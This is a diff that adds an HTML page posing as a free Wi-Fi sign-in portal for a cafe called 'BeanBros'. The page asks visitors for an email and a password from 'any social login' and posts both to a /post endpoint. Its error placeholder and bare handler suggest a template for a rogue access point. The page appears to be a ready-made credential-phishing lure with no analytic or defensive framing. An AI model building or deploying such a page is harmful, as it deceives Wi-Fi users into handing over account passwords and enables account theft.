@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>BeanBros Cafe - Free Wi-Fi</title>
+<style>
+*{box-sizing:border-box}
+body{font-family:-apple-system,BlinkMacSystemFont,Helvetica,Arial,sans-serif;margin:0;background:#f5efe6;color:#3b2a1a;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:18px}
+.card{background:#fff;border-radius:12px;box-shadow:0 12px 32px rgba(50,30,10,.12);padding:30px 28px;max-width:380px;width:100%}
+.logo{display:flex;align-items:center;justify-content:center;gap:8px;font-size:22px;font-weight:700;margin-bottom:6px;color:#7a4b22}
+.tag{text-align:center;font-size:12px;letter-spacing:1.5px;color:#a47a4a;margin-bottom:24px;text-transform:uppercase}
+h1{font-size:18px;margin:0 0 6px;text-align:center}
+p.lead{font-size:13px;line-height:1.5;margin:0 0 20px;color:#6e5a44;text-align:center}
+.err{margin:0 0 14px;padding:9px 11px;background:#fdecea;border:1px solid #f5c2bd;border-radius:6px;color:#b13a2c;font-size:13px}
+.err:empty{display:none}
+label{display:block;font-size:12px;margin:14px 0 5px;color:#5d4527;font-weight:600;letter-spacing:.3px}
+input{width:100%;padding:11px 12px;font-size:14px;border:1px solid #d8c7ad;border-radius:6px;background:#fffaf2}
+input:focus{outline:none;border-color:#7a4b22;box-shadow:0 0 0 2px rgba(122,75,34,.18)}
+button{margin-top:22px;width:100%;background:#7a4b22;color:#fff;border:none;padding:13px;font-size:14px;font-weight:600;border-radius:6px;cursor:pointer;letter-spacing:.5px}
+button:hover{background:#5e3a1a}
+.foot{font-size:11px;color:#9c8866;margin-top:18px;text-align:center;line-height:1.5}
+.foot a{color:#7a4b22;text-decoration:none}
+#lo{position:fixed;inset:0;background:rgba(255,250,242,.96);display:none;flex-direction:column;align-items:center;justify-content:center;z-index:10}
+#lo.show{display:flex}
+.sp{border:4px solid #efe1c8;border-top:4px solid #7a4b22;border-radius:50%;width:40px;height:40px;animation:spin 1s linear infinite;margin-bottom:16px}
+@keyframes spin{to{transform:rotate(360deg)}}
+</style>
+</head>
+<body>
+<div class="card">
+<div class="logo">&#9749; BeanBros</div>
+<div class="tag">Cafe &middot; Free Wi-Fi</div>
+<h1>Sign in to continue</h1>
+<p class="lead">Use your loyalty account or any social login to enjoy 30 minutes of complimentary Wi-Fi.</p>
+<div class="err">%ERROR%</div>
+<form action="/post" method="POST" onsubmit="document.getElementById('lo').classList.add('show')">
+<label>Email</label>
+<input type="email" name="username" placeholder="you@example.com" autocomplete="email" required>
+<label>Password</label>
+<input type="password" name="password" autocomplete="current-password" required>
+<button type="submit">Connect</button>
+</form>
+<div class="foot">By continuing you accept the <a href="#">terms of service</a>.<br>Powered by &copy; BeanBros Hospitality</div>
+</div>
+<div id="lo"><div class="sp"></div><p>Connecting&hellip;</p></div>
+</body>
+</html>
